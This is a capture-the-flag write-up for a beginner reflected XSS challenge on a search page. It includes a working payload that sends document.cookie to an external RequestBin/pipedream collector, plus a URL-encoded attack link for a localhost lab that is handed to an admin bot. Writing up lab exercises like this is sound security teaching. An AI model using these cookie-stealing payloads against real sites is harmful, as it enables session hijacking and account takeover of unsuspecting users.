## Challenge 1: Reflected XSS on a Search Page (Beginner)

### Objective: 
Perform a reflected XSS attack by injecting JavaScript to steal the admin cookie.

### Write-up
The search page has a search bar that reflects the user input back to the page. This is a potential XSS vulnerability.

We know the search bar is vulnerable to XSS by inputting a simple script tage:
```
<script>alert('XSS')</script>
```
Our goal is to steal the admin cookie by injecting JavaScript code that sends the cookie to our server.

We know that the admin cookie will check every links that posted on the website for a period of time. We can use this to our advantage by creating a link that will send the admin cookie to our server through that POST request (Debug route).

First, we need to create a payload that get the cookie from the browser. We can use the following payload:
```html
<script>alert(document.cookie)</script>
```
This payload will display the cookie in an alert box.

Then we need to create a payload that sends the cookie to our server. We can use RequestBin to create a temporary server that help us to capture the cookie. We can use the following payload:
```html
<script>
    var img = new Image();
    img.src = "https://eno50641w4bu.x.pipedream.net/?q=" + encodeURIComponent(document.cookie);
</script>
```

Now we can build the final url that will be used in the search bar:
```
http://localhost:3000/search.php?query=%3Cscript%3Evar+img+%3D+new+Image%28%29%3Bimg.src+%3D+%22https%3A%2F%2Feno50641w4bu.x.pipedream.net%2F%3Fq%3D%22%2B%27%27%2BencodeURIComponent%28document.cookie%29%3B%3C%2Fscript%3E
```

We can now try to search for the url in the search bar and see if we can retrieve my own cookie.

Finally, we can post the link to the admin via the debug submission form and wait for the admin to click on the link. Once the admin clicks on the link, the cookie will be sent to our server and we can capture it using RequestBin.



